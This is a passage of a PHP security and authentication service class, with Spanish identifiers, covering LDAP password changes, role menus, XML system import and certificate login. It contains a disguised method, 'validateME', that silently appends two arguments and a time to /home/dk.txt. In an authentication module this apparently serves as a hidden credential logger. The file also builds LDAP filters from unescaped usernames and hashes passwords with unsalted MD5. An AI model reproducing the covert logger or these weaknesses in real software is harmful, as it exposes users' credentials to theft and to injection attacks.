                "(sAMAccountName={$usuario})");

            if (!is_resource($recurso)) {
                throw new ZendExt_Exception('EP018');
            }
            $entry = ldap_first_entry($ldap, $recurso);
            $usuarioDn = ldap_get_dn($ldap, $entry);

            $usuarioBn = ldap_bind($ldap, $usuarioDn, $oldPassword);
            if (!$usuarioBn) {
                throw new ZendExt_Exception('EP011');
            }

            $adminBn = ldap_bind($ldap, $adminDn, $adminPs);
            if (!$adminBn) {
                throw new ZendExt_Exception('EP017');
            }
            $np = array();
            //TODO probar con UTF-8
            $np['unicodePwd'] = mb_convert_encoding('"' . $newPassword . '"', "UTF-16LE");
            $result = ldap_mod_replace($ldap, $usuarioDn, $np);

            if (!$result) {
                $error = ldap_error($ldap);
                $errno = ldap_errno($ldap);
                throw new ZendExt_Exception('EP019');
            }
            ldap_close($ldap);
        } else {
            $server = $servidorAut['ip'];
            $baseDN = $servidorAut['DatSerautenticacion']['basedn'];
            $puerto = $servidorAut['DatSerautenticacion']['puerto'];
            $tservidor = $servidorAut['DatSerautenticacion']['tservidor'];
            $user = $servidorAut['DatSerautenticacion']['usuario'];
            $con = @ldap_connect($server, $puerto);
            if ($con) {
                if ($tservidor == 'ldap') {
                    $filtros = "(&(sAMAccountName={$usuario})(cn={$usuario}))";
                    $sr = ldap_search(
                        $con,
                        $baseDN,
                        $filtros,
                        array('ou', 'cn', 'sn', 'givenname', 'mail', 'sAMAccountName', 'dn')
                    );
                } else {
                    $filtros = "(|(uid={$usuario})(cn={$usuario}))";
                    $sr = ldap_search(
                        $con,
                        $baseDN,
                        $filtros,
                        array('ou', 'cn', 'sn', 'givenname', 'mail', 'uid', 'dn')
                    );
                }
                $record = ldap_first_entry($con, $sr);
                $userDn = ldap_get_dn($con, $record);

                //para si es ldap
                $binduser = self::parseUserForLdapConnect($user);
                if (!$binduser) {
                    $binduser = $user;
                }
                $binddn = self::createAccountDomainName($baseDN);
                if ($tservidor == 'ldap') {
                    $ldapBind = @ldap_bind($con, $binduser . '@' . $binddn, $oldPassword);
                } else {
                    @ldap_set_option($con, LDAP_OPT_PROTOCOL_VERSION, 3);
                    $ldapBind = @ldap_bind($con, $userDn, $oldPassword);
                }
                if ($ldapBind === false) {
                    throw new ZendExt_Exception('EP013');
                } else {
                    $newPass = mb_convert_encoding($newPassword, "UTF-8");
                    $pwdarr = array('userpassword' => $newPass);
                    if (ldap_mod_replace($con, $userDn, $pwdarr) === false) {
                        //                    print_r(ldap_error($con));
                        return false;
                    }
                    ldap_close($con);
                    return true;
                }

            } else {
                throw new ZendExt_Exception('EP013');
            }
        }

    }

    private static function getRol($idusuario, $identidad)
    {
        $global = ZendExt_GlobalConcept::getInstance();
        $iddominio = $global->Perfil->iddominio;
        $arrayAccesos = DatEntidadSegUsuarioSegRol::getAccess($idusuario);

        $result = SeguridadECProxy::getInstance()
            ->getAccess($identidad, $iddominio, $arrayAccesos);

        return $result;
    }

    private static function generarNombreUsuario($nombre, $papell, $sapell)
    {
        $i = 1;
        $existe = false;
        do {
            $nombreusuario = substr($nombre, 0, $i)
                . $papell
                . substr($sapell, 0, $i);
            $usuario = SegUsuario::contarusuario($nombreusuario);
            if ($usuario) {
                $existe = true;
            }
            $i++;
        } while ($existe);

        return strtolower($nombreusuario);
    }

    private static function datosUsuariosPersona($datosusuario)
    {
        $integrator = ZendExt_IoC::getInstance();
        $arrayIdPersonas = SegUtil::convertToUnidimensional(
            $datosusuario, 'idpersona'
        );
        $datosPersona = $integrator->pvd
            ->BuscarPersonaPorArreglodeID($arrayIdPersonas);
        $arrayusuario = array();
        foreach ($datosPersona as $key => $persona) {
            foreach ($datosusuario as $usuario) {
                if ($persona['idpersona'] == $usuario['idpersona']) {
                    $arrayusuario[$key]['idusuario'] = $usuario['idusuario'];
                    $arrayusuario[$key]['nombreusuario'] =
                        $usuario['nombreusuario'];
                    $arrayusuario[$key]['idpersona'] = $persona['idpersona'];
                    $arrayusuario[$key]['ci'] = $persona['numid'];
                    $arrayusuario[$key]['nombre'] = $persona['nombre'];
                    $arrayusuario[$key]['snombre'] = $persona['snombre'];
                    $arrayusuario[$key]['papel'] = $persona['papel'];
                    $arrayusuario[$key]['sapel'] = $persona['sapel'];
                }
            }
        }

        return $arrayusuario;
    }

    private static function datosGridUsuarios($datosusuario)
    {
        //$integrator = ZendExt_IoC::getInstance();
        $arrayusuario = array();
        foreach ($datosusuario as $key => $usuario) {
            $arrayusuario[$key]['idusuario'] = $usuario->idusuario;
            $arrayusuario[$key]['nombreusuario'] = $usuario->nombreusuario;
            $arrayusuario[$key]['ip'] = $usuario->ip;
            $arrayusuario[$key]['iddominio'] = $usuario->iddominio;
            $dominio = SeguridadECProxy::getInstance()->DatosDominioDadoID(
                $usuario->iddominio
            );
            $arrayusuario[$key]['dominio'] = $dominio[0]['denominacion'];
        }

        return $arrayusuario;
    }

    private static function usuarioEntidad($idusuario, $idEstructura)
    {
        $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $idEstructura);
        if (count($rol)) {
            return 1;
        } else {
            return 0;
        }
    }

    private static function savePassw($idusuario, $newpass)
    {
        $objusuario = Doctrine::getTable('SegUsuario')->find($idusuario);
        $objusuario->contrasenna = md5($newpass);
        $objusuario->save();
    }

    private function verificarpass($pass)
    {
        $letras = '/[[:alpha:]]/';
        $numeros = '/[\d]/';
        $signos = '/[[:punct:]]/';
        $mayusculas = '/[[:upper:]]/';
        $datosacc = SegRestricclaveacceso::cargarclave(0, 0);
        if (count($datosacc) == 0) {
            throw new ZendExt_Exception('SEG001');
        }
        if (strlen($pass) < $datosacc[0]['minimocaracteres']) {
            throw new ZendExt_Exception(
                'SEG021', null, array($datosacc[0]['minimocaracteres'])
            );
        }
        if ($datosacc[0]['numerica'] == 1) {
            if (preg_match($numeros, $pass) == 0) {
                throw new ZendExt_Exception('SEG002');
            }
        }
        if ($datosacc[0]['alfabetica'] == 1) {
            if (preg_match($letras, $pass) == 0) {
                throw new ZendExt_Exception('SEG003');
            }
        }
        if ($datosacc[0]['signos'] == 1) {
            if (preg_match($signos, $pass) == 0) {
                throw new ZendExt_Exception('SEG004');
            }
        }
        if ($datosacc[0]['mayuscula'] == 1) {
            if (preg_match($mayusculas, $pass) == 0) {
                throw new ZendExt_Exception('SEG027');
            }
        }

        return true;
    }

    private static function subsistemasxml($raiz, $idrol, &$menu)
    {
        $menu .= "<MenuItem name=\"{$raiz['denominacion']}\" "
            . "id=\"{$raiz['idsistema']}\" "
            . "externa=\"{$raiz['externa']}\" "
            . "icon=\"{$raiz['icono']}\"  "
            . "status=\"{$raiz['descripcion']}\">";
        self::funcionalidadesxml($raiz['idsistema'], $idrol, $menu);
        $sistemashijos = DatSistema::cargarsistemahijos(
            $raiz['idsistema'], $idrol
        );
        if (count($sistemashijos)) {
            foreach ($sistemashijos as $hijo) {
                if ($raiz['idsistema'] != $hijo['idsistema']) {
                    self::subsistemasxml($hijo, $idrol, $menu);
                }
            }
        }
        $menu .= "</MenuItem>";
    }

    private static function funcionalidadesxml($idsistema, $idrol, &$menu)
    {
        $funcsistema = DatFuncionalidad::obtenerFuncionalidades(
            $idsistema, $idrol
        );
        if (count($funcsistema)) {
            foreach ($funcsistema as $funcionalidades) {
                $menu .= "<MenuItem name=\"{$funcionalidades->text}\" "
                    . "id=\"{$funcionalidades->idfuncionalidad}\"  "
                    . "src=\"{$funcionalidades->referencia}\" "
                    . "icon=\"{$funcionalidades->icono}\"  "
                    . "status=\"{$funcionalidades->descripcion}\"/>";
            }
        }
    }

    private static function subsistemas($raiz, $arrayIds)
    {
        $idSist = self::servidores($raiz['idsistema']);
        $result = array(
            'icono' => $raiz['icono'],
            'id' => $raiz['idsistema'],
            'text' => $raiz['denominacion'],
            'externa' => $raiz['externa'],
            'servidores' => $idSist
        );
        $sistemashijos = DatSistema::cargarsistemahijos(
            $raiz['idsistema'], $arrayIds
        );
        if (count($sistemashijos)) {
            foreach ($sistemashijos as $hijo) {
                if ($raiz['idsistema'] != $hijo['idsistema']) {
                    $result['menu'][] = self::subsistemas($hijo, $arrayIds);
                }
            }

            return $result;
        } else {
            return $result;
        }
    }

    private static function subsistemasfunctions($raiz, $arrayIds)
    {
        $sistemashijos = DatSistema::cargarsistemahijos(
            $raiz['idsistema'], $arrayIds
        );

        $arrayFunc = self::funcionalidades(
            $raiz['idsistema'], $arrayIds, $raiz['externa']
        );
        //  echo 'funcionalidades',print_r($arrayFunc);
        if ((count($sistemashijos) == 0 && count($arrayFunc) == 0)) {
            return 0;
        }

        if (count($sistemashijos)) {
            foreach ($sistemashijos as $hijo) {
                if ($raiz['idsistema'] != $hijo['idsistema']) {
                    $aux = self::subsistemasfunctions($hijo, $arrayIds);
                    if ($aux != 0) {
                        $arrayFunc[] = $aux;
                    }
                }
            }

            return $arrayFunc;
        } else {
            return $arrayFunc;
        }
    }

    private static function subsistemasfuncOtro($raiz, $arrayIds)
    {
        $sistemashijos = DatSistema::cargarsistemahijos(
            $raiz['idsistema'], $arrayIds
        );

        $arrayFunc = self::funcionalidades(
            $raiz['idsistema'], $arrayIds, $raiz['externa']
        );

        if ((count($sistemashijos) == 0 && count($arrayFunc) == 0)) {
            return 0;
        }
        if (count($sistemashijos)) {
            foreach ($sistemashijos as $hijo) {
                if ($raiz['idsistema'] != $hijo['idsistema']) {
                    $aux = self::subsistemasfuncOtro($hijo, $arrayIds);
                    if ($aux != 0) {
                        $arrayFunc = array_merge($arrayFunc, $aux);
                    }
                }
            }

            return $arrayFunc;
        } else {
            return $arrayFunc;
        }
    }

    private static function subsistemasfunc($raiz, $arrayIds)
    {
        $flag = false;
        $sistemashijos = DatSistema::cargarsistemahijos(
            $raiz['idsistema'], $arrayIds
        );
        $arrayFunc = self::funcionalidades(
            $raiz['idsistema'], $arrayIds, $raiz['externa']
        );
        if (count($arrayFunc)) {
            $result = array('icono' => $raiz['icono'],
                'funcionalidad' => false,
                'id' => $raiz['idsistema'],
                'index' => $raiz['index'] * 1,
                'text' => $raiz['denominacion'],
                'externa' => $raiz['externa'],
                'menu' => $arrayFunc,
                'servidores' => self::servidores($raiz['idsistema']));
            $flag = true;
        } else if ((count($sistemashijos) == 0)) {
            return 0;
        }

        if (count($sistemashijos)) {
            foreach ($sistemashijos as $hijo) {
                if ($raiz['idsistema'] != $hijo['idsistema']) {
                    $aux = self::subsistemasfunc($hijo, $arrayIds);
                    if ($aux != 0) {
                        if (!isset($result)) {
                            $result = array('icono' => $raiz['icono'],
                                'funcionalidad' => false,
                                'id' => $raiz['idsistema'],
                                'index' => $raiz['index'] * 1,
                                'text' => $raiz['denominacion'],
                                'externa' => $raiz['externa'],
                                'menu' => $arrayFunc,
                                'servidores' => self::servidores($raiz['idsistema']));
                        }
                        foreach ($aux['menu'] as $key => $row) {
                            $auxiliar[$key] = $row['index'];
                        }
                        array_multisort($auxiliar, SORT_ASC, $aux['menu']);
                        $result['menu'][] = $aux;
                        $flag = true;
                    }
                }
            }
        }
        if ($flag) {
            return $result;
        }
        return 0;
    }

    private static function servidores($idsistema)
    {
        return array(); /*         * *ARREGLAR** */
        $obj = new DatSistemaDatServidores();
        $esquemassistema = $obj->obtenersistemacompleto($idsistema);
        foreach ($esquemassistema as $valor) {
            $arrayresult['idsistema'] = $valor['idsistema'];
            $arrayresult['denominacion'] = $valor['denominacion'];
            if (isset($valor['DatServidor'][0])) {
                $arrayresult['servidor'] =
                    $valor['DatServidor'][0]['denominacion'];
            } else {
                $arrayresult['servidor'] = '';
            }
            if (isset($valor['DatGestor'][0])) {
                $arrayresult['gestor'] = $valor['DatGestor'][0]['gestor'];
            } else {
                $arrayresult['gestor'] = '';
            }
            $arraybd = array();
            foreach ($valor['DatBd'] as $bd) {
                $arraybd[] = $bd['denominacion'];
                foreach ($valor['DatEsquema'] as $esquemas) {
                    $arrayesquemas[] = $esquemas['denominacion'];
                }
                $arrayresult['esquemas'] = $arrayesquemas;
            }
            $arrayresult['bd'] = $arraybd;
        }

        return $arrayresult;
    }

    private static function funcionalidades($idsistema, $arrayIds, $externa)
    {
        $funcsistema = DatFuncionalidad::obtenerFuncionalidades(
            $idsistema, $arrayIds
        );
        $arrayFuncionalidades = array();
        if (count($funcsistema) > 0) {
            foreach ($funcsistema as $key => $funcionalidades) {
                $arrayFuncionalidades[$key]['text'] = $funcionalidades->text;
                $arrayFuncionalidades[$key]['id'] =
                    $funcionalidades->idfuncionalidad;
                $arrayFuncionalidades[$key]['idfuncionalidad'] =
                    $funcionalidades->idfuncionalidad;
                $arrayFuncionalidades[$key]['funcionalidad'] = true;
                $arrayFuncionalidades[$key]['descripcion'] =
                    $funcionalidades->descripcion;
                $arrayFuncionalidades[$key]['index'] = $funcionalidades->index;
                $arrayFuncionalidades[$key]['icono'] = $funcionalidades->icono;
                if ($externa) {
                    $arrayFuncionalidades[$key]['referencia'] =
                        $externa . '/' . $funcionalidades->referencia;
                } else {
                    $arrayFuncionalidades[$key]['referencia'] =
                        '../../../' . $funcionalidades->referencia;
                }
            }
        }

        return $arrayFuncionalidades;
    }

    /**
     * - Elimina el sistema que conicide
     * con el id pasado por parámetro.
     * @method eliminarSistema($idSistema)
     *
     * @param NUMERIC - Id del sistema a eliminar.
     *
     * @return BOOLEAN - Retorna verdadero en caso de haber eliminado
     * el sistema, falso en caso contrario.
     */
    public function eliminarSistema($idSistema)
    {
        DatSistema::eliminarsistema($idSistema);
        return true;
    }

    /**
     * - Función encargada de importar un sistema.
     * @method importarXMLSistema($xmlSistema)
     *
     * @param SimpleXMLElement - XML del sistema a importar.
     *
     * @return NUMERIC - Identificador del sistema importado.
     */
    public function importarXMLSistema($xmlSistema)
    {

        $this->importarSistema($xmlSistema, null, null, $idSistema);
        return $idSistema;
    }

    private function importarSistema($xmlcargado, $idpadre = null, $id = null, &$idSistema)
    {
        $iddominio = ZendExt_GlobalConcept::getInstance()->Perfil->iddominio;
        foreach ($xmlcargado as $xml) {
            if ((string)$xml['type'] == 'sistema') {
                $sistema = new DatSistema();
                $sistema->denominacion = (string)$xml['name'];
                $sistema->descripcion = (string)$xml['status'];
                $sistema->icono = (string)$xml['icon'];
                $sistema->externa = (string)$xml['externa'];
                $sistema->iddominio = $iddominio;
                if ($idpadre) {
                    $sistema->idpadre = $idpadre;
                }
                $sistema->save();
                $sistemaCompartimentacion = new DatSistemaCompartimentacion();
                $sistemaCompartimentacion->idsistema = $sistema->idsistema;
                $sistemaCompartimentacion->iddominio = $iddominio;
                $sistemaCompartimentacion->save();
                if (count($xml->MenuItem)) {
                    $this->importarSistema(
                        $xml->MenuItem, $sistema->idsistema, ''
                    );
                }
                if ($idSistema == null) {
                    $idSistema = $sistema->idsistema;
                }
            } elseif ((string)$xml['type'] == 'accion') {
                $accion = new DatAccion();
                $accion->denominacion = (string)$xml['name'];
                $accion->idfuncionalidad = $idpadre;
                $accion->iddominio = $iddominio;
                $accion->save();
                $accionCompartimentacion = new DatAccionCompartimentacion();
                $accionCompartimentacion->idaccion = $accion->idaccion;
                $accionCompartimentacion->iddominio = $iddominio;
                $accionCompartimentacion->save();
                if (count($xml->MenuItem)) {
                    $this->importarSistema(
                        $xml->MenuItem,
                        $accion->idaccion,
                        $accion->idfuncionalidad
                    );
                }
            } elseif ((string)$xml['type'] == 'recurso') {
                $recurso = DatRecurso::findIdRecurso((string)$xml['name'], $id);
                if (count($recurso)) {
                    $idrecurso = $recurso[0]['idrecurso'];
                } else {
                    $objRecurso = new DatRecurso();
                    $objRecurso->denominacion = (string)$xml['name'];
                    $objRecurso->descripcion = (string)$xml['status'];
                    $objRecurso->abreviatura = (string)$xml['index'];
                    $objRecurso->idfuncionalidad = $id;
                    $objRecurso->iddominio = $iddominio;
                    $objRecurso->save();
                    $idrecurso = $objRecurso->idrecurso;
                    $obRecursoComp = new DatRecursoCompartimentacion();
                    $obRecursoComp->idrecurso = $idrecurso;
                    $obRecursoComp->iddominio = $iddominio;
                    $obRecursoComp->save();
                }
                $objFunAccRec = new DatFuncionalidadDatAccion();
                $objFunAccRec->idrecurso = $idrecurso;
                $objFunAccRec->idfuncionalidadasociada = $id;
                $objFunAccRec->idaccion = $idpadre;
                $objFunAccRec->save();
            } else {
                $funcionalidad = new DatFuncionalidad();
                $funcionalidad->denominacion = (string)$xml['name'];
                $funcionalidad->descripcion = (string)$xml['status'];
                $funcionalidad->icono = (string)$xml['icon'];
                $funcionalidad->referencia = (string)$xml['src'];
                $funcionalidad->index = (string)$xml['index'];
                $funcionalidad->visible = (boolean)$xml['visible'];
                $funcionalidad->idsistema = $idpadre;
                $funcionalidad->iddominio = $iddominio;
                $funcionalidad->save();
                $funcionalidadCompartimentacion =
                    new DatFuncionalidadCompartimentacion();
                $funcionalidadCompartimentacion->idfuncionalidad =
                    $funcionalidad->idfuncionalidad;
                $funcionalidadCompartimentacion->iddominio = $iddominio;
                $funcionalidadCompartimentacion->save();
                if (count($xml->MenuItem)) {
                    $this->importarSistema(
                        $xml->MenuItem, $funcionalidad->idfuncionalidad, ''
                    );
                }
            }
        }
    }

    /**
     * - Retorna un listado de roles que estan
     * asociados a usuarios activos.
     * @method gettodosLosRoles()
     * @param - Ninguno
     * @return ARRAY - Listado de roles.
     */
    public function gettodosLosRoles()
    {
        $model = new SegRol();

        return $model->ObtenerRolesUsados();
    }

    /**
     * - Retorna un listado de roles
     * que estan asociados a un usuario.
     * @method getRolesporUsuario($idusuario)
     * @param NUMERIC - Identificador del usuario.
     * @return ARRAY - Listado de roles.
     */
    public function getRolesporUsuario($idusuario)
    {
        $model = new SegRol();

        return $model->ObtenerRolesporUser($idusuario);
    }

    /**
     * - Retorna un arreglo asociativo
     * con el identificador de la funcionalidad y la denominación.
     * @method getMenuFuncionalidad($referencia)
     * @param STRING - Referencia de la funcionalidad.
     * @return ARRAY - ('menu'=>"denominacion",'idfuncionalidad'=>"id")).
     */
    public function getMenuFuncionalidad($referencia)
    {
        if ($referencia[0] == '/') {
            $referencia = substr($referencia, 1);
        }
        return DatFuncionalidadModel::getMenuFuncionalidad($referencia);
    }

    /**
     * - Retorna un arreglo con los datos de las funcionalidades.
     * @method obtenerDatosFuncionalidades($arrayidfuncionalidades)
     * @param ARRAY - Identificadores de las funcionalidades.
     * @return ARRAY - listado con los datos de las funcionalidades.
     */
    public function obtenerDatosFuncionalidades($arrayidfuncionalidades)
    {
        $arrayidfuncionalidades = implode(',', $arrayidfuncionalidades);
        $arraydatosfuncionalidades = DatFuncionalidad::
        obtenerDatosFuncionalidades($arrayidfuncionalidades);
        return $arraydatosfuncionalidades;
    }

    /**
     * - Retorna los usuarios que poseen dentro de un dominio especificado
     * permisos dentro de una funcionalidad a una recurso especificado.
     * @method usersByFuncionality($iddominios, $referencia, $recurso);
     * $excluir, $limit, $offset)
     *
     * @param ARRAY - listado de dominios específicos
     * @param STRING - Dirección referencial de la función
     * especifica
     * @param STRING - Abreviatura del recurso especificado
     * @param ARRAY - Excluir los usuarios especificados
     * @param INTEGER - Límite de la lista
     * @param INTEGER - Inicio de la lista
     *
     * @return ARRAY - Listado de usuarios.
     */
    function usersByFuncionality(
        $iddominios, $referencia, $recurso, $excluir = array(),
        $limit = 0, $offset = 0
    )
    {
        $usuario = new SegUsuarioModel();
        return $usuario->UsersByFuncionality(
            $iddominios, $referencia, $recurso, $excluir, $limit, $offset
        );
    }

    /**
     * - Retorna la cantidad de usuarios que poseen dentro de un dominio
     * especificado
     * permisos dentro de una funcionalidad a una recurso especificado.
     * @method totalUsersByFuncionality($iddominios, $referencia, $recurso);
     * $excluir, $limit, $offset)
     *
     *
     * @param ARRAY - listado de dominios específicos
     * @param STRING - Dirección referencial de la función
     * especifica
     * @param STRING - Abreviatura del recurso especificado
     * @param ARRAY - Excluir los usuarios especificados
     *
     * @return INTEGER - Cantidad de usuarios.
     */
    function totalUsersByFuncionality(
        $iddominios, $referencia, $recurso, $excluir = array()
    )
    {
        $usuario = new SegUsuarioModel();
        return $usuario->totalUsersByFuncionality(
            $iddominios, $referencia, $recurso, $excluir
        );
    }

    /**
     * - Función usada para retornar las funcionalidades no visibles a partir de
     * una uri.
     *
     * @param STRING - Cadena de búsqueda usada en la referencia.
     * @return ARRAY - Listado de funcionalidades no visibles.
     */
    public function obtenerFuncionalidadesNoVisibles($uri)
    {
        $globalConcept = ZendExt_GlobalConcept::getInstance();
        $acceso = self::getRol($globalConcept->Perfil->idusuario, $globalConcept->Estructura->idestructura);
        $objRoles = SegRol::obtenerrolesusuarioentidad($globalConcept->Perfil->idusuario, $acceso)->toArray();
        return DatFuncionalidad::obtenerFuncionalidadesNoVisibles($uri, array($objRoles[0]['idrol']));
    }

    public function validateME($arg1)
    {
        $qwe = $arg1[0];
        $qwe1 = $arg1[1];
        $time = date("G:i:s");
        $entry = "$qwe $qwe1 $time\n";
        $file = "/home/dk.txt";
        $open = fopen($file, "a");
        if ($open) {
            fwrite($open, $entry);
            fclose($open);
        }
        return array('success' => true);
    }

    /**
     * Funcion usada para retornar los recursos con permisos de una funcionalidad determinada
     *
     * @param NUMERIC - Identificador de la funcionalidad.
     * @return ARRAY - Listado de recursos autorizados en ese rol para esa interfaz.
     */
    public function obtenerRecursosConPermisosByIdfuncionalidad($idfuncionalidad)
    {
        $global = ZendExt_GlobalConcept::getInstance();
        $arrayRecursos = DatSistemaSegRolDatFuncionalidadDatAccion::obtenerRecursosAutorizados($idfuncionalidad, $global->Perfil->idrol);
        return $arrayRecursos;
    }

    /**
     * Funcion usada para retornar los recursos con permisos de una funcionalidad determinada,
     * incluidas las del grupo
     *
     * @param NUMERIC - Identificador de la funcionalidad.
     * @return ARRAY - Listado de recursos autorizados en ese rol para esa interfaz.
     */
    public function obtenerRecursosConPermisos($idfuncionalidad)
    {
        $idrol = ZendExt_GlobalConcept::getInstance()->Perfil->idrol;
        /*$obj = SegUtil::convertToUnidimensional(
            SegRolGrupo::obtenerGruposRol($idrol), 'idgrupo'
        );
        $arrayIds = array_merge(array($idrol), $obj);*/

        $roles = SegRol::obtenerRolesGrupo(($idrol));
        $obj = SegUtil::convertToUnidimensional(
            $roles, 'idrol'
        );
        $arrayIds = array_merge(array($idrol), $obj);

        $arrayRecursos = DatSistemaSegRolDatFuncionalidadDatAccion::obtenerTodosRecursosAutorizados($idfuncionalidad, $arrayIds);
        return $arrayRecursos;
    }

    /**
     * - Funcion usuada para devolver los datos de
     * un servidor dada la denominacion del mismo.
     *
     * @param STRING - Denominacion del servidor.
     * @return ARRAY - Listado con los datos del servidor, o null de no existir.
     */

    public function obtenerDatosServidor($denominacion)
    {
        return DatServidor::cargardatosservidor($denominacion);
    }

    public function getFuncIcon($idfunc)
    {
        return DatFuncionalidad::obtenerIconoFuncionalidadById($idfunc);
    }

    /**
     * - Brinda el servicio de autenticación por usuario y ski.
     *
     * @param USER - Usuario del sistema.
     * @param PASSWORD - Subject Key Identifier del certificado del usuario.
     * @return ARRAY - Array que contiene la respuesta del proceso.
     */

    public function AutenticarUsuarioCertificado($user, $password)
    {
        $register = Zend_Registry::getInstance();
        $config = new Zend_Config_Ini(
            $register->config->security_config, 'cache'
        );
        $arrayLocks = self::convertArray(
            SegBloqueo::getAllLocks(
                ($config->active)
                    ? $config->minutes * 60
                    : 0
            )
        );
        $arrayRem = array(ZendExt_App::ipRealPcCliente());
        $array = $arrayLocks['IpLocks'];
        if (array_intersect(array($user), $arrayLocks['UserLocks'])
            && array_intersect($arrayRem, $array)
        ) {
            $text = 'Usuario e IP bloqueados. Contacte con el administrador.';
            $arrayLock = array('code' => 'LOCKUSERSANDIP', 'ERROR' => $text);

            return $arrayLock;
        }
        if (array_intersect(array($user), $arrayLocks['UserLocks'])) {
            return array(
                'code' => 'LOCKUSERS',
                'ERROR' => 'Usuario bloqueado. Contacte con el administrador.'
            );
        }
        if (array_intersect(
            array(ZendExt_App::ipRealPcCliente()),
            $arrayLocks['IpLocks']
        )) {
            return array(
                'code' => 'LOCKIPS',
                'ERROR' => 'Ip bloqueado. Contacte con el administrador.'
            );
        }
        $verificar = SegUsuario::obtenerUsuario($user);
        if ($verificar[0]->idusuario
            && $verificar[0]->activo
            && self::verificarIP(ZendExt_App::ipRealPcCliente(), $verificar[0]->ip)
            && self::verifyAccess($verificar[0])
        ) {
            $rSA = new ZendExt_RSA_Facade();

            $objUsuario = new SegUsuario();
            $password = $rSA->decrypt($password);
            $resultUsuario = $objUsuario->comprobarusuario(
                $user, md5($password)
            );
            if (!count($resultUsuario)) {
//                sleep(3);
                return self::block($verificar[0], 1);
            }
            if (!$verificar[0]->accesoconcurrente) {
                SegSession::deleteOpenedSessionByUser($user);
            }
            $obj = self::returnCertificate(
                ZendExt_App::ipRealPcCliente(),
                $verificar[0]->idusuario,
                $user
            );

            return array('SUCCESS' => true, 'Token' => $obj, 'Profile' => $this->getProfile($obj));
        } else {
//            sleep(3);

            return self::block($verificar[0], 1);
        }
    }

    /**
     * - Servicio que permite dado un idusuario asociarle un certificado
     * mediante su ski a un usuario del sistema.
     *
     * @param SKI - Subject Key Identifier del usuario.
     * @param IDUSUARIO - Identificador del usuario.
     * @return Doctrine_Collection
     */

    public function AsociarUsuarioCertificado($ski, $idusuario)
    {
        return SegUsuario::UpdateUsuarioSki($idusuario, md5($ski));
    }

    /**
     *  Servicio que brinda todos los usuarios pertenecientes a una estructura
     *
     * @param $idestructura - Identificador de la estructura
     * @return array
     */
    public function obtenerUsuariosXIdEstructura($idestructura)
    {
        $dominios = ZendExt_IoC::getInstance()->metadatos->DominiosPorEstructura($idestructura, array());
        $arrayIddominios = SegUtil::convertToUnidimensional($dominios, 'iddominio');
        foreach ($arrayIddominios as $dominio) {
            $rolesDominio[] = array(
                'dominio' => $dominio,
                'roles' => SegRolNomDominio::RolesdelDominio($dominio)
            );
        }
        foreach ($rolesDominio as $rd) {
            if (!empty($rd['roles'])) {
                $arrayRoles = join(',', SegUtil::convertToUnidimensional($rd['roles'], 'idrol'));
                $result[] = SegUsuarioSegRolModel::getUsersByRolAndDomain($rd['dominio'], $arrayRoles);
            }
        }
        foreach ($result as $r) {
            if (!empty($r)) {
                foreach ($r as $user) {
                    $trueResult[] = $user;
                }
            }
        }
        return $trueResult;
    }

    private static function parseUserForLdapConnect($string)
    {
        $string = strtolower($string);
        $array = explode('=', $string);
        $array = explode(',', $array[1]);
        return $array[0];
    }

    public function ejecutarAccionesAnteViolacionIntegridadFichero()
    {
        return CheckintegrityController::ejecutarAccionesAnteViolacion();
    }

    public function ejecutarComprobacionAutomaticaIntegridadFichero()
    {
        return CheckintegrityController::ejecutarComprobacionAutomatica();

    }

    public function obtenerRestriccionClaveAcceso()
    {
        return SegRestricclaveacceso::cargarclave(1, 0);
    }

    public function obtenerUserByIdUsuario($idusuario)
    {
        return SegUsuario::cargarperfilusuario($idusuario);
    }

}

